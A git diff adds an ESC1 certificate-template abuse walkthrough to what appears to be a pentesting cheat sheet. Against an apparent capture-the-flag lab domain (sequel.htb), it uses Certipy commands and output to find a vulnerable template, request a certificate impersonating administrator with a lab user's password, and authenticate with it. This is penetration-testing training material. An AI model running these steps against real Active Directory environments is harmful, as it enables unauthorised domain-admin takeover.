@@ -710,6 +710,119 @@ sudo ntpdate 10.10.x.x
 
 
 ### certipy (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
+- ESC1 Type
+```bash
+# certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
+
+### example
+┌──(root㉿kali)-[~/tools/Certipy]
+└─# certipy-ad find -u ryan.cooper -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+
+
+# Use CA Name and Template Name to make a request
+certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target 10.10.11.202 -ca sequel-dc-ca -template UserAuthentication
+
+┌──(root㉿kali)-[~/tools/Certipy]
+└─# certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target 10.10.11.202 -ca sequel-dc-ca -template UserAuthentication
+
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+                                                                                                                    
+┌──(root㉿kali)-[~/tools/Certipy]
+└─# certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target 10.10.11.202 -ca sequel-dc-ca -template UserAuthentication
+
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 23
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+                                                            
+# Use certificate to authenticate as administrator
+certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202
+```
+
 ```bash
 certipy find -u raven -p password -dc-ip 10.x.x.x -stdout -vulnerable
 
